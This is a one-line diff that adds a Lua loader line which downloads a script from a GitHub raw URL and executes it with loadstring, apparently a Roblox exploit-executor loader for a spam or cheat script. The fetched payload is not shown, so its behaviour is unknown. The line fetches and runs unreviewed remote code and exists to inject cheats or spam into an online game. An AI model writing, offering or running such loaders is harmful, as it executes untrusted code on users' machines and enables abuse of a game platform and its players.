@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/beta-buddytime-spam1-4wbzjd7ngecps9.lua"))()
